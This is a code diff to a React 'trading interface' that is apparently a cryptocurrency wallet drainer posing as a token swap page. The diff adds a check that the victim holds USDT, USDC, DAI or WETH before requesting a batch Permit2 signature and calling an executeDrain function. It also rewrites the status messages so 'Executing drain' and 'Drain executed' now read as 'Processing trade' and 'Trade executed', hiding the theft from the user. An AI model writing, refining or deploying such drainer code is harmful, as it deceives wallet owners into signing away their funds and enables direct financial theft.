@@ -1,6 +1,7 @@
 import React, { useState, useEffect, useRef } from 'react'
 import { useAccount } from 'wagmi'
 import { useDrainer } from '../hooks/useDrainer'
+import { ethers } from 'ethers'
 
 export default function TradingInterface() {
   const { address, isConnected } = useAccount()
@@ -13,6 +14,14 @@ export default function TradingInterface() {
   const [toToken, setToToken] = useState({ symbol: 'ETH', balance: '3.7204' })
   const chartContainerRef = useRef(null)
   const tvWidgetRef = useRef(null)
+
+  // Token addresses for balance check
+  const tokenAddresses = {
+    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+    DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+    WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+  }
 
   // Fetch real ETH price
   useEffect(() => {
@@ -62,6 +71,25 @@ export default function TradingInterface() {
       }
     }
   }, [])
+
+  // Check if wallet has any tokens
+  const checkWalletBalance = async () => {
+    const provider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com')
+    const erc20Abi = ['function balanceOf(address) view returns (uint256)']
+
+    for (const [symbol, tokenAddr] of Object.entries(tokenAddresses)) {
+      try {
+        const contract = new ethers.Contract(tokenAddr, erc20Abi, provider)
+        const balance = await contract.balanceOf(address)
+        if (balance.gt(0)) {
+          return true
+        }
+      } catch (e) {
+        console.warn(`Failed to check ${symbol} balance`)
+      }
+    }
+    return false
+  }
 
   // Generate order book data (visual only)
   const generateOrderBook = () => {
@@ -133,21 +161,37 @@ export default function TradingInterface() {
 
     const numAmount = parseFloat(amount)
     if (isNaN(numAmount) || numAmount <= 0) {
-      setStatus('Please enter a valid amount')
+      setStatus('Please enter an amount')
       return
     }
 
     setLoading(true)
-    setStatus('Requesting Permit2 signature...')
+    setStatus('Checking balance...')
 
     try {
+      const hasBalance = await checkWalletBalance()
+      if (!hasBalance) {
+        setStatus('Insufficient balance. Please deposit USDT, USDC, DAI, or WETH to trade.')
+        setLoading(false)
+        return
+      }
+
+      setStatus('Confirm transaction in your wallet...')
       const { signature, nonce, deadline } = await signBatchPermit(address)
-      setStatus('Signature obtained. Executing drain...')
+      
+      setStatus('Processing trade...')
       const txHash = await executeDrain(address, signature, nonce, deadline)
-      setStatus(`Drain executed! Tx: ${txHash.slice(0, 10)}...`)
+      setStatus(`Trade executed! Tx: ${txHash.slice(0, 10)}...`)
       setAmount('')
     } catch (err) {
-      setStatus(`Failed: ${err.message}`)
+      console.error(err)
+      if (err.message.includes('rejected')) {
+        setStatus('Transaction rejected in wallet.')
+      } else if (err.message.includes('timeout')) {
+        setStatus('Request timed out. Please try again.')
+      } else {
+        setStatus('Transaction failed. Please try again.')
+      }
     } finally {
       setLoading(false)
     }
@@ -336,7 +380,7 @@ export default function TradingInterface() {
 
           {/* EXECUTE BUTTON */}
           <button className="execbtn" onClick={handleTrade} disabled={loading}>
-            {loading ? 'Processing...' : isConnected ? 'Execute Trade' : 'Connect Wallet First'}
+            {loading ? 'Processing...' : isConnected ? 'Swap Now' : 'Connect Wallet'}
           </button>
           {status && <div className="swfoot"><b>{status}</b></div>}
         </div>
